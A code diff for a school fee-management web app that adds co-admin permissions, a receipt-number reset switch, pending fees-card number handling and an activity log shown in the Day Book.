                   <div style="font-weight:700;font-size:14px;color:#1a1a2e;margin-bottom:12px;"><i class="fas fa-users" style="color:#667eea;"></i> Existing Co-admins</div>
@@ -2744,7 +3020,7 @@
             if(!pwd||pwd.length!==6) { showErr('6-digit password is required!'); return; }
             const myCoAdmins = coAdmins.filter(ca=>ca.adminCode===currentUser.code);
             if(myCoAdmins.length>=2) { showErr('Maximum 2 co-admins limit has been reached!'); return; }
-            const newCa = { id: Date.now().toString(), name, code, password: pwd, databaseName: db, adminCode: currentUser.code, createdAt: new Date().toLocaleString('en-IN'), blocked: false };
+            const newCa = { id: Date.now().toString(), name, code, password: pwd, databaseName: db, adminCode: currentUser.code, createdAt: new Date().toLocaleString('en-IN'), blocked: false, permissions: collectPermsFromCheckboxes('caNew') };
             const updated = [...coAdmins, newCa];
             try {
                 await fsSave('coAdmins', updated);
@@ -2767,6 +3043,20 @@
             await fsSave('coAdmins', updated);
             coAdmins = updated;
             showPopup('✅ Co-admin password updated successfully!');
+            navigateTo(renderAccessibility);
+        }
+
+        function showEditAccess(code) {
+            let box = document.getElementById('editAccessBox_' + code);
+            if(box) box.style.display = box.style.display === 'none' ? 'block' : 'none';
+        }
+
+        async function saveCoAdminAccess(code) {
+            const perms = collectPermsFromCheckboxes('caEdit_' + code);
+            const updated = coAdmins.map(ca => ca.code === code ? {...ca, permissions: perms} : ca);
+            await fsSave('coAdmins', updated);
+            coAdmins = updated;
+            showPopup('✅ Access updated successfully!');
             navigateTo(renderAccessibility);
         }
 
@@ -2835,6 +3125,24 @@
                             </div>
                         </div>
                     </div>
+                    <div class="form-card">
+                        <h3 style="color:#1a1a2e; font-size:18px; margin-bottom:6px;"><i class="fas fa-receipt" style="color:#ef4444;"></i> &nbsp;Start Receipt Number from Starting</h3>
+                        <p style="font-size:12.5px; color:#888; margin-bottom:16px; line-height:1.6;">
+                            Is option ko ON karne se sabhi receipt numbers (Admission - ADM, Quick Payment - QP,
+                            Fees Card - FC, aur Admission Receipt - ADR) reset hokar dobara <strong>0001</strong> se shuru ho jaayenge.
+                            ON karte hi reset ho jaayega aur yeh switch khud-ba-khud OFF ho jaayega.
+                        </p>
+                        <div style="display:flex; align-items:center; justify-content:space-between; background:#f8f9fa; border-radius:14px; padding:16px 18px;">
+                            <div style="display:flex; align-items:center; gap:10px;">
+                                <i class="fas fa-rotate-left" style="color:#ef4444; font-size:18px;"></i>
+                                <span style="font-size:14.5px; font-weight:600; color:#1a1a2e;">Reset Receipt Numbers (ADM / QP / FC / ADR)</span>
+                            </div>
+                            <label class="reset-receipt-switch">
+                                <input type="checkbox" id="resetReceiptToggle" onchange="handleResetReceiptToggle(this)">
+                                <span class="reset-receipt-slider"></span>
+                            </label>
+                        </div>
+                    </div>
                 </div>
                 ${getOverlay()}
                 <div id="addClassModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:1001; justify-content:center; align-items:center;">
@@ -2868,6 +3176,38 @@
                 </div>
             </div>`;
             renderClassList();
+
+            window.handleResetReceiptToggle = (chk) => {
+                if(!chk.checked) return; // switch sirf ON hone par hi trigger karta hai
+                let _confirmMsg = 'Are you sure you want to reset your all receipts number?\n\n' +
+                    'When you reset, then your all receipt numbers are removed and it starts from 0001.';
+                if(!confirm(_confirmMsg)) { chk.checked = false; return; }
+
+                // Sabhi 4 sequence counters ko 0 par reset karo, taaki agla generated
+                // number 0001 se shuru ho (ADM-0001, QP-0001, FC-0001, ADR-0001).
+                _admissionSeqNumber = 0;
+                _qpSeqNumber = 0;
+                _fcSeqNumber = 0;
+                _adrSeqNumber = 0;
+
+                localStorage.setItem('eRegister_admission_seq', '0');
+                localStorage.setItem('eRegister_qp_seq', '0');
+                localStorage.setItem('eRegister_fc_seq', '0');
+                localStorage.setItem('eRegister_adr_seq', '0');
+
+                SCHOOL_DOC.set({
+                    admissionSeqNumber: '0',
+                    qpSeqNumber: '0',
+                    fcSeqNumber: '0',
+                    adrSeqNumber: '0'
+                }, { merge: true }).catch(()=>{});
+
+                showPopup('✅ Receipt Numbers Reset Successfully');
+
+                // Reset hone ke turant baad switch khud-ba-khud OFF — taaki dobara
+                // reset karna ho to ise phir se ON kiya ja sake.
+                chk.checked = false;
+            };
 
             window.openAddClassModal = () => {
                 document.getElementById('addClassModal').style.display = 'flex';
@@ -3229,8 +3569,17 @@
             
             selectedMonths = [new Date().getMonth()];
             
-            // Get FC number for this fees card session
-            let fcNumber = getNextFCNumber();
+            // Custom columns added via the "+" button are temporary for this card session only -
+            // they are NOT saved into the global feesColumns list, so they vanish once you leave this page.
+            let sessionFeesColumns = feesColumns.filter(c => c.toLowerCase().trim() !== 'book').slice();
+            
+            // Get FC number for this fees card session - reuse pending number if not yet saved
+            let fcNumber = pendingFcNumbers[studentId];
+            if(!fcNumber) {
+                fcNumber = peekNextFCNumber();
+                pendingFcNumbers[studentId] = fcNumber;
+                fsSave('pendingFcNumbers', pendingFcNumbers); localStorage.setItem('eRegister_pending_fc', JSON.stringify(pendingFcNumbers));
+            }
             
             function renderTable() {
                 let multiplier = selectedMonths.length > 0 ? selectedMonths.length : 1;
@@ -3246,7 +3595,7 @@
                     <th style="width:50px; text-align:center;">#</th>
                     <th>Student Name</th>
                     <th style="width:100px;">Class</th>`;
-                feesColumns.forEach(col => { 
+                sessionFeesColumns.forEach(col => { 
                     tableHtml += `<th style="min-width:120px;">${col}</th>`; 
                 });
                 if(showExamCol) {
@@ -3272,7 +3621,7 @@
                         <td style="text-align:center;">${idx + 1}</td>
                         <td>${member.name}${freeBadgeHtml}</td>
                         <td>${member.className}</td>`;
-                    feesColumns.forEach(col => {
+                    sessionFeesColumns.forEach(col => {
                         let isFixed = col.toLowerCase().replace(/\s+/g,'') === 'tuitionfees';
                         let value = '';
                         if(isFixed) {
@@ -3468,7 +3817,9 @@
                     let paytmAmt = parseFloat(document.getElementById('mopPaytmAmount')?.value) || 0;
                     mopDetails = `Cash: ₹${cashAmt}, Paytm: ₹${paytmAmt}`;
                 }
-                let fcReceiptNumber = getNextFCNumber();
+                let fcReceiptNumber = commitFCNumber(fcNumber);
+                delete pendingFcNumbers[studentId];
+                fsSave('pendingFcNumbers', pendingFcNumbers); localStorage.setItem('eRegister_pending_fc', JSON.stringify(pendingFcNumbers));
                 
                 familyMembers.forEach(member => {
                     let memberFees = currentData[member.id] || {};
@@ -3501,6 +3852,7 @@
                     };
                     if(!paymentHistory[member.id]) paymentHistory[member.id] = [];
                     paymentHistory[member.id].push(historyRecord);
+                    logActivity('Fees Submitted', `Student: ${member.name}, Contact: ${member.contact||'-'}, Receipt: ${receiptNo}, FC: ${fcReceiptNumber}, Discount: ${document.getElementById('discountAmount')?.value||0}, Member Total: ₹${memberTotal}, Mode: ${modeOfPayment}${mopDetails?(' ['+mopDetails+']'):''}, Submitted: ₹${totalPaid}, Balance: ₹${currentBalance}`);
                 });
                 fsSaveWithChecksum('paymentHistory', paymentHistory); localStorage.setItem('eRegister_payment_history', JSON.stringify(paymentHistory));
                 
@@ -3588,13 +3940,12 @@
                 if(!inp) return;
                 let colName = inp.value.trim();
                 if(!colName) { showPopup('Column name empty hai!', false); return; }
-                if(feesColumns.includes(colName)) { showPopup('Yeh column already exist karta hai!', false); return; }
-                feesColumns.push(colName);
-                fsSave('feesColumns', feesColumns); localStorage.setItem('eRegister_fees_columns', JSON.stringify(feesColumns));
+                if(sessionFeesColumns.includes(colName)) { showPopup('Yeh column already exist karta hai!', false); return; }
+                sessionFeesColumns.push(colName);
                 document.getElementById('customColModalFC').style.display = 'none';
                 inp.value = '';
                 renderTable();
-                showPopup('✅ Column "' + colName + '" add ho gaya!');
+                showPopup('✅ Column "' + colName + '" add ho gaya! (temporary — sirf isi card ke liye)');
             };
 
             renderTable();
@@ -4179,6 +4530,8 @@
                 localStorage.setItem('eRegister_admission_seq', String(window._admissionSeqNumber));
                 fsSaveWithChecksum('admissions', admissions);
                 localStorage.setItem('eRegister_admissions',JSON.stringify(admissions));
+                let admittedNames = ad.type==='single' ? (ad.name||'') : (ad.students||[]).map(s=>s.name).join(', ');
+                logActivity('Admission Approved', `Admission No: ${admNum}, Student(s): ${admittedNames}`);
                 showPopup('✅ Student approved! Admission No: ' + admNum);
                 navigateTo(renderApproval);
             }
@@ -5730,6 +6083,28 @@
                 printDayBookEntries(selected);
             };
 
+            function buildActivityTable() {
+                let entries = activityLog || [];
+                if(entries.length === 0) {
+                    return `<div style="text-align:center;padding:24px;color:#999;font-size:14px;"><i class="fas fa-inbox"></i> No activity entries yet.</div>`;
+                }
+                let rows = entries.map((e,i) => `<tr style="background:${i%2===0?'white':'#f9fafb'};">
+                        <td style="padding:8px 10px;font-size:12px;white-space:nowrap;">${e.date}<br><span style="color:#999;font-size:10px;">${e.time||''}</span></td>
+                        <td style="padding:8px 10px;font-size:12px;font-weight:600;">${e.coAdminName||''}</td>
+                        <td style="padding:8px 10px;font-size:12px;font-weight:700;color:#4f46e5;">${e.type||''}</td>
+                        <td style="padding:8px 10px;font-size:12px;max-width:380px;word-break:break-word;">${e.details||''}</td>
+                    </tr>`).join('');
+                return `<div style="overflow-x:auto;max-height:420px;overflow-y:auto;"><table style="width:100%;border-collapse:collapse;min-width:600px;">
+                    <thead><tr style="background:#4f46e5;color:white;font-size:12px;position:sticky;top:0;z-index:2;">
+                        <th style="padding:10px 8px;text-align:left;">Date & Time</th>
+                        <th style="padding:10px 8px;text-align:left;">Co-Admin</th>
+                        <th style="padding:10px 8px;text-align:left;">Action</th>
+                        <th style="padding:10px 8px;text-align:left;">Details</th>
+                    </tr></thead>
+                    <tbody>${rows}</tbody>
+                </table></div>`;
+            }
+
             document.getElementById('app').innerHTML = `
             <div class="inner-bg"><div class="sticky-header">${getHeader('Day Book', true)}</div><div class="inner-container">
             <div class="form-card">
@@ -5753,9 +6128,9 @@
                     <p style="color:#666;font-size:13px;margin-top:8px;">All Quick Payment records — income &amp; expense entries.</p>
                 </div>
             </div>
-            <div style="background:linear-gradient(135deg,#dcfce7,#bbf7d0);border-radius:16px;padding:16px;margin-bottom:20px;">
-                <h3 style="color:#15803d;margin-bottom:12px;font-size:16px;font-weight:700;"><i class="fas fa-arrow-up"></i> Income</h3>
-                ${buildTable(income, '#10b981', 'Income')}
+            <div style="background:linear-gradient(135deg,#e0e7ff,#c7d2fe);border-radius:16px;padding:16px;margin-bottom:20px;">
+                <h3 style="color:#4338ca;margin-bottom:12px;font-size:16px;font-weight:700;"><i class="fas fa-clipboard-list"></i> Activity</h3>
+                ${buildActivityTable()}
             </div>
             <div style="background:linear-gradient(135deg,#fee2e2,#fecaca);border-radius:16px;padding:16px;">
                 <h3 style="color:#dc2626;margin-bottom:12px;font-size:16px;font-weight:700;"><i class="fas fa-arrow-down"></i> Expense</h3>
